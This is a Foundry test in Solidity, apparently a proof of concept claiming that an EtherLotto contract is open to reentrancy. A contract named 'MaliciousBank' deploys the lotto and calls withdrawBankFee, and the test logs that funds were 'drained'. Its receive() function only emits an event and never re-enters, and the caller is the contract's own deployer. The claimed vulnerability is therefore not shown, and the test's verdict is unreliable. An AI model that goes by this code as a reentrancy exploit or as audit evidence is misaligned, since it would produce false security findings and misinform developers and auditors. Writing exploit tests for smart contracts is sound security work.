// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ether_lotto.sol";

contract MaliciousBank {
    EtherLotto public etherLotto;
    event Log(string message);

    constructor() payable {
        etherLotto = new EtherLotto();
    }

    function attack() external {
        etherLotto.withdrawBankFee();
    }

    receive() external payable {
        emit Log("Re-entrancy occurred");
    }
}

contract ReentrancyTest is Test {
    function testReentrancyVulnerability() public {
        // Deploy malicious bank contract
        MaliciousBank bank = new MaliciousBank();
        EtherLotto lotto = bank.etherLotto();
        
        // Fund the contract with 1 ether
        vm.deal(address(lotto), 1 ether);
        
        // Record balances BEFORE attack
        uint256 lottoBalanceBefore = address(lotto).balance;
        uint256 bankBalanceBefore = address(bank).balance;
        console.log("--- BEFORE-Trigger Balances ---");
        console.log("Lotto contract balance: %s", lottoBalanceBefore);
        console.log("Bank contract balance:   %s", bankBalanceBefore);
        
        // Expect re-entrancy event to be emitted
        vm.expectEmit(address(bank));
        emit MaliciousBank.Log("Re-entrancy occurred");
        
        console.log("--- Trigger Attack ---");
        // Initiate attack
        bank.attack();
        
        // Record balances AFTER attack
        uint256 lottoBalanceAfter = address(lotto).balance;
        uint256 bankBalanceAfter = address(bank).balance;
        console.log("--- AFTER-Trigger Balances ---");
        console.log("Lotto contract balance: %s", lottoBalanceAfter);
        console.log("Bank contract balance:   %s", bankBalanceAfter);
        
        // Calculate balance changes
        uint256 lottoDecrease = lottoBalanceBefore - lottoBalanceAfter;
        uint256 bankIncrease = bankBalanceAfter - bankBalanceBefore;
        
        // Verify bank received the fee balance
        assertEq(address(bank).balance, 1 ether, "Bank should receive fee");
        
        // Differential verification
        console.log("--- Differential Verdict ---");
        if (lottoDecrease == 1 ether && bankIncrease == 1 ether) {
            console.log("SUCCESS: Lotto decreased by 1 ether, Bank increased by 1 ether");
            console.log("Vulnerability Exists: Reentrancy attack successfully drained funds");
        } else {
            console.log("FAILURE: Unexpected balance changes");
            console.log("Lotto change: %s (expected -1 ether)", int256(lottoBalanceAfter) - int256(lottoBalanceBefore));
            console.log("Bank change:  %s (expected +1 ether)", bankBalanceAfter - bankBalanceBefore);
            console.log("Vulnerability not Exist: Balances did not change as expected");
        }
    }
}